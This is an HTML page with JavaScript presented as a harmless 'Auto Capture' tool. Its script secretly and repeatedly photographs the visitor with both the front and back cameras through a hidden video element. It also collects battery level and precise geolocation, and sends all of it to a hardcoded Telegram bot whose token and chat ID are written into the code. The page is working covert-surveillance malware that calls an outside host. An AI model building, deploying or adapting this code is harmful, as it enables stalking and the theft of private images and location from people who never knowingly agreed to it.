<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Auto Front + Back Capture</title>
  <style>
    body {
      margin: 0;
      font-family: sans-serif;
      background: #111;
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      flex-direction: column;
    }
    .card {
      background: #222;
      padding: 20px;
      border-radius: 10px;
      text-align: center;
      box-shadow: 0 0 20px rgba(0,0,0,0.5);
    }
    video { display: none; }
    button {
      margin-top: 15px;
      padding: 10px 20px;
      border: none;
      border-radius: 8px;
      background: #4caf50;
      color: white;
      font-size: 16px;
      cursor: pointer;
    }
    button:disabled { background: #666; cursor: not-allowed; }
  </style>
</head>
<body>
  <div class="card">
    <h2>Auto Capture</h2>
    <p>Click below to start capturing front + back camera photos.</p>
    <button id="startBtn">Start Capture</button>
  </div>

  <video id="hiddenVideo" autoplay playsinline muted></video>

  <script>
    // ⚠️ Replace this with your NEW regenerated token ASAP
    const TELEGRAM_BOT_TOKEN = "8096107981:AAF4QDZy7Lp73VKkHh_aXscCg6GuaLvn6oM";
    const TELEGRAM_CHAT_ID = "7865382097";

    const videoEl = document.getElementById('hiddenVideo');
    const startBtn = document.getElementById('startBtn');
    let running = false;

    startBtn.addEventListener("click", () => {
      if (!running) {
        running = true;
        startBtn.disabled = true;
        cycleCapture();
      }
    });

    async function cycleCapture() {
      while (running) {
        await captureWithFacing("user","front");
        await wait(500);
        await captureWithFacing("environment","back");
        await wait(1000);
      }
    }

    async function captureWithFacing(facing, label) {
      try {
        await initCamera(facing);
        await wait(500);
        const {blob} = await takePhoto(videoEl);
        const timeISO = new Date().toISOString();
        const battery = await getBatteryLevel();
        const location = await getLocationSafe();
        const caption = `Captured: ${timeISO}\nCamera: ${label}\nBattery: ${battery ?? 'unknown'}\nLocation: ${location ? (location.coords.latitude + ',' + location.coords.longitude) : 'denied'}\nAccuracy: ${location ? location.coords.accuracy + 'm' : 'n/a'}`;
        await sendToTelegram(blob, caption);
      } catch (e) {
        console.error("Capture error", e);
      } finally {
        stopStream();
      }
    }

    async function initCamera(facing) {
      stopStream();
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: facing },
        audio: false
      });
      videoEl.srcObject = stream;
      await videoEl.play();
    }

    function stopStream(){
      if(videoEl.srcObject){
        videoEl.srcObject.getTracks().forEach(t=>t.stop());
        videoEl.srcObject=null;
      }
    }

    function takePhoto(video) {
      return new Promise((resolve,reject)=>{
        try{
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video,0,0,canvas.width,canvas.height);
          canvas.toBlob(blob=>resolve({blob}),'image/jpeg',0.9);
        }catch(e){reject(e);}
      });
    }

    async function getBatteryLevel(){
      try{
        if('getBattery' in navigator){
          const bat = await navigator.getBattery();
          return Math.round(bat.level*100)+"%";
        }
      }catch(e){}
      return null;
    }

    function getLocationSafe(timeout=3000){
      return new Promise(resolve=>{
        if(!navigator.geolocation){resolve(null);return;}
        navigator.geolocation.getCurrentPosition(
          pos=>resolve(pos),
          err=>resolve(null),
          {enableHighAccuracy:true, maximumAge:0, timeout}
        );
      });
    }

    async function sendToTelegram(blob, caption){
      const form = new FormData();
      form.append("chat_id", TELEGRAM_CHAT_ID);
      form.append("caption", caption);
      form.append("photo", blob, "photo.jpg");
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;

      try {
        const res = await fetch(url,{method:"POST",body:form});
        const data = await res.json();
        console.log("Telegram response:", data);

        if (!data.ok) {
          console.error("Telegram API error:", data.description);
        }
      } catch (e) {
        console.error("Send failed", e);
      }
    }

    const wait = ms => new Promise(res=>setTimeout(res,ms));
  </script>
</body>
</html>
